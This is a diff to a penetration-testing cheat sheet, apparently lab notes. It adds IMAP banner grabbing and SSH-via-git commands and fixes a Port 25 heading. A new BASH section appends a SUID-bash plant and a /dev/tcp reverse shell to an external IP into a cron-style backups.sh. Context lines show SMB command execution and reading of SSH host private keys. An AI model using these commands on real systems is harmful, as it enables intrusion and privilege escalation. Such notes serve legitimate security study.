@@ -11,13 +11,14 @@ Table of Contents
          * [Audio](#audio)
       * [Port 21 - FTP](#port-21-ftp)
       * [Port 22 - SSH](#port-22-ssh)
-      * [Port 25 - Telnet](#port-25-telnet)
+      * [Port 25 - SMTP](#port-25-smtp)
       * [Port 69 - UDP - TFTP](#port-69-udp-tftp)
       * [Kerberos - 88](#kerberos-88)
       * [Port 110 - Pop3](#port-110-pop3)
       * [Port 111 - Rpcbind](#port-111-rpcbind)
       * [Port 135 - MSRPC](#port-135-msrpc)
       * [Port 139/445 - SMB](#port-139445-smb)
+      * [Port 143/993 - IMAP](#port-143993-imap)
       * [Port 161/162 UDP - SNMP](#port-161162-udp-snmp)
       * [LDAP - 389,636](#ldap-389636)
       * [HTTPS - 443](#https-443)
@@ -73,6 +74,7 @@ Table of Contents
          * [Bad path configuration](#bad-path-configuration)
          * [Find plain passwords](#find-plain-passwords)
          * [Scripts](#scripts)
+            * [BASH](#bash)
             * [SUID](#suid)
             * [PS Monitor for cron](#ps-monitor-for-cron)
             * [MSFVENOM LIBRARY Priv Esc](#msfvenom-library-priv-esc)
@@ -288,6 +290,10 @@ OpenSSH_8.1p1, OpenSSL 1.1.1d  10 Sep 2019
 ...
 debug1: Authentications that can continue: publickey,password,keyboard-interactive
 
+SSH via Non-Standard Port:
+
+$ ssh -v 10.10.1.111 -p 43022
+
 Force Auth Method:
 
 $ ssh -v 10.10.1.111 -o PreferredAuthentications=password
@@ -298,6 +304,11 @@ SSH Login with id_rsa file:
 
 $ ssh -i id_rsa fox@192.168.152.126
 
+SSH via Git:
+
+$ GIT_SSH_COMMAND='ssh -i id_rsa -o IdentitiesOnly=yes' git clone ssh://git@192.168.212.125:43022/git-server (non-standard port)
+
+$ GIT_SSH_COMMAND='ssh -i ~/Proving_Grounds/Hunit/id_rsa -o IdentitiesOnly=yes' git push (Done from within the git repo)
 
 BruteForce:
 
@@ -338,7 +349,9 @@ python ssh_user_enum.py --port 2223 --userList /root/Downloads/users.txt IP 2>/d
 
 ```
 
-## Port 25 - Telnet
+## Port 25 - SMTP
+
+https://book.hacktricks.xyz/pentesting/pentesting-smtp#basic-information
 
 ```
 nc -nvvC 10.11.1.111 25
@@ -528,7 +541,13 @@ smbmap.py -u username -p 'P@$$w0rd1234!' -d ABC -H 10.11.1.111 -x 'powershell -c
 # Check
 \Policies\{REG}\MACHINE\Preferences\Groups\Groups.xml look for user&pass "gpp-decrypt "
 ```
+## Port 143/993 IMAP
 
+Banner Grab
+```
+telnet 10.11.1.111 143
+
+openssl s_client -connect 10.11.1.111:993 -quiet
 
 ## Port 161/162 UDP - SNMP
 
@@ -1562,7 +1581,11 @@ cat /etc/ssh/ssh_host_rsa_key
 cat /etc/ssh/ssh_host_key.pub
 cat /etc/ssh/ssh_host_key
 ```
+Privilege Escalation with SSH keys
 
+```
+https://steflan-security.com/linux-privilege-escalation-exploiting-misconfigured-ssh-keys/ 
+```
 ### Bad path configuration
 
 Require user interaction
@@ -1577,6 +1600,13 @@ grep -rnw '/' -ie 'DB_USER' --color=always
 ```
 
 ### Scripts
+
+### BASH
+```
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> backups.sh
+
+echo 'bash -i >& /dev/tcp/192.168.49.212/12445 0>&1' >> backups.sh
+```
 
 #### SUID
 
